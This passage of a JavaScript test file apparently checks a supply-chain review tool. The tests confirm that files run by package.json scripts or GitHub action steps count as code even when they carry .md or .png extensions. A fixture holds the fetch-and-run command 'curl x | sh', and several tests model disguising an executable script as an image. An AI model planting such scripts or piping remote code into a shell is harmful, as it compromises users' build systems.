  assert.ok(classifyPackageFiles(pkg(false)).codeSet.has('docs/payload.md'));
  assert.equal(inspectPackageFiles(pkg(true)).inspected, false, 'a root-script payload over the budget is not inspected');

  // A composite action that runs `npm run check` in its own folder: action.yml never names package.json.
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: cd "$GITHUB_ACTION_PATH" && npm run check\n      shell: bash\n';
  const contents = sub => ({ [`${sub}action.yml@v1`]: yml, [`${sub}action.yml@v2`]: yml, [`${sub}package.json@v2`]: JSON.stringify({ scripts: { check: 'bash docs/payload.md' } }) });
  mockGitHub({ compare: compareFiles({ filename: 'docs/payload.md', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }), contents: contents('') });
  assert.equal((await reviewAction(change, 100)).complete, false, 'the changed .md the root script runs is required');
  // A sub-path action reads the package.json in its own folder.
  mockGitHub({ compare: compareFiles({ filename: 'setup/docs/payload.md', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }), contents: contents('setup/') });
  assert.equal((await reviewAction({ ...change, action: 'acme/act/setup' }, 100)).complete, false);
});

test('a file a script runs is code even with an image extension; a mention in code is not', async () => {
  const pkg = body => files({
    'package.json': JSON.stringify({ main: 'index.js', scripts: { check: 'bash docs/payload.png' } }),
    'index.js': "require('child_process').execSync('npm run check', { cwd: __dirname }); // logo.png",
    'docs/payload.png': body,
    'logo.png': 'png',
  });
  const cls = classifyPackageFiles(pkg('EVIL_SH'));
  assert.ok(cls.codeSet.has('docs/payload.png'), 'the script runs it');
  assert.ok(!cls.codeSet.has('logo.png'), 'code that only mentions an image does not make it code');
  assert.equal(inspectPackageFiles(pkg('EVIL_SH')).inspected, true);
  assert.ok(inspectPackageFiles(pkg('EVIL_SH')).text.includes('EVIL_SH'));
  assert.equal(inspectPackageFiles(pkg('\0binary')).inspected, false, 'a binary one cannot be inspected');

  // Updated package: the changed .png the script runs is required.
  const diff = fileDiff('docs/payload.png', `+${'X'.repeat(500)}`);
  assert.equal(reviewNpmDiff(diff, { files: pkg('x'), unsupported: [] }, 100).complete, false);
  assert.ok(reviewNpmDiff(diff, { files: pkg('x'), unsupported: [] }, 1e6).text.includes('XXXX'));

  // Action: a run: step and a root package.json script each name a .png.
  for (const [yml, manifest] of [
    ['runs:\n  using: composite\n  steps:\n    - run: bash docs/payload.png\n      shell: bash\n', null],
    ['runs:\n  using: composite\n  steps:\n    - run: npm run check\n      shell: bash\n', JSON.stringify({ scripts: { check: 'bash docs/payload.png' } })],
  ]) {
    mockGitHub({
      compare: compareFiles({ filename: 'docs/payload.png', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
      contents: { 'action.yml@v1': yml, 'action.yml@v2': yml, ...(manifest ? { 'package.json@v2': manifest } : {}) },
    });
    assert.equal((await reviewAction(change, 100)).complete, false, manifest ? 'named by a root script' : 'named by a run: step');
  }
});

test("a change to an action's root package.json is always shown, since npm run executes its scripts", async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: npm run check\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: 'package.json', status: 'modified', patch: `@@\n-"check": "echo safe"\n+"check": "${'C'.repeat(500)}"` }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml, 'package.json@v2': '{"scripts":{"check":"curl x | sh"}}' },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'an oversized manifest change is not fully reviewed');
  const r = await reviewAction(change, 1e6);
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('CCCC'), 'a fitting manifest change is shown');
});
